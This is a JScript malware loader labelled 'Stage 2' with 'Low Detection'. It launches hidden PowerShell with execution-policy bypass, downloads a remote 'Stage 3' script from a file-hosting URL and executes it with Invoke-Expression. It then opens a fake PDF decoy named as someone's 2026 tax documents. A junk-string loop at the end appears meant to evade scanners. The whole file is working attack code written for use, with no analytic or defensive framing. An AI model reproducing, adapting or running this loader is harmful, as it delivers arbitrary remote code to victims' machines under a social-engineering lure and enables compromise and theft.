// =============================================
// Minimal Stage 2 Loader - Low Detection
// =============================================

(function() {
    try {
        var wsh = new ActiveXObject("WScript.Shell");

        // Stage 3 URL (your working one)
        var stage3 = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_efcc1ebbd3cd4dc7bf98297714c77239.txt";

        // Run Stage 3
        var cmd = '-ep Bypass -WindowStyle Hidden -c "Invoke-Expression (Invoke-WebRequest -Uri \'' + stage3 + '\' -UseBasicParsing).Content"';
        wsh.Run("powershell.exe " + cmd, 0, false);

        WScript.Sleep(700);

        // Decoy
        var decoy = '-ep Bypass -WindowStyle Hidden -c "Invoke-WebRequest -Uri \'https://www.google.com\' -OutFile \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\'; Start-Process \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\'"';
        wsh.Run("powershell.exe " + decoy, 0, false);

    } catch(e) {}

    // Minimal junk (less suspicious)
    var junk = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
    for(var i = 0; i < 85; i++) {
        junk += junk;
    }
})();